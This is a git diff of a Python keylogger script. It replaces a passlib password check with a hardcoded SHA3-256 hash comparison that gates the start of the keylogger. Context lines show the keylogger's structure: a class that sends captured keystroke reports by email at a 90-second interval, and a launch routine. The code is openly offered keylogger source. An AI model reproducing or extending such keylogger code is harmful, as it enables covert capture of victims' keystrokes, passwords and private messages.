@@ -5,7 +5,7 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from passlib.hash import sha256_crypt
+import hashlib
 
 SEND_REPORT_EVERY = 90 # email send interval in seconds
 EMAIL_ADDRESS = "email@dogpile.com"# email account you want to use
@@ -87,22 +87,17 @@ class Keylogger:
         self.report() #making the message
         print(f"{datetime.now()} - Started keylogger") #block the thread and wait for user input of CTRL C
         keyboard.wait()
-        
+              
 def passwordCheck(): # Requests user for password and validates it
-
-    userInput = input("Please enter a password: ") # User enters a password
-
-    passwordHash = sha256_crypt.hash("P@ssw0rd") # Hash of saved password 
-
-    if(sha256_crypt.verify(userInput, passwordHash)): # Compare hashes
+    userInput = input("Please enter a password: ").encode() # User enters a password and encodes it into bytes
+    userInputHash = hashlib.sha3_256(userInput).hexdigest() # Converts userInput to a hash
+    if(userInputHash == "5329091ef26383d2d686ee2afcc529eee90e47e3a4ef7cb2e1c4b7d0f20eb965"): # Compare hashes 
        return True
     else:
        return False
         
 if __name__ == "__main__":
-           
-    yayOrNay = passwordCheck() # Password check
-    
+    yayOrNay = passwordCheck() # Password check  
     if(yayOrNay == True):      # If Password is correct, runs Keylogger     
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
         keylogger.start()
